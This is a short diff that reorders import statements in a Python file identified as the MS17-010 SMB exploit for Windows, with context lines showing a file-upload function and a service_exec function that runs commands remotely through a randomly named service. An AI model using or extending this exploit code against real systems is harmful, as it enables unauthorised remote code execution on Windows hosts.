@@ -1,10 +1,11 @@
 #!/usr/bin/python
+import socket
+import sys
+import time
+from struct import pack, unpack, unpack_from
+
 from impacket import smb, smbconnection
 from mysmb import MYSMB
-from struct import pack, unpack, unpack_from
-import sys
-import socket
-import time
 
 '''
 MS17-010 exploit for Windows 2000 and later by sleepya
@@ -934,7 +935,8 @@ def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
 def service_exec(conn, cmd):
 	import random
 	import string
-	from impacket.dcerpc.v5 import transport, srvs, scmr
+
+	from impacket.dcerpc.v5 import scmr, srvs, transport
 	
 	service_name = ''.join([random.choice(string.letters) for i in range(4)])
 
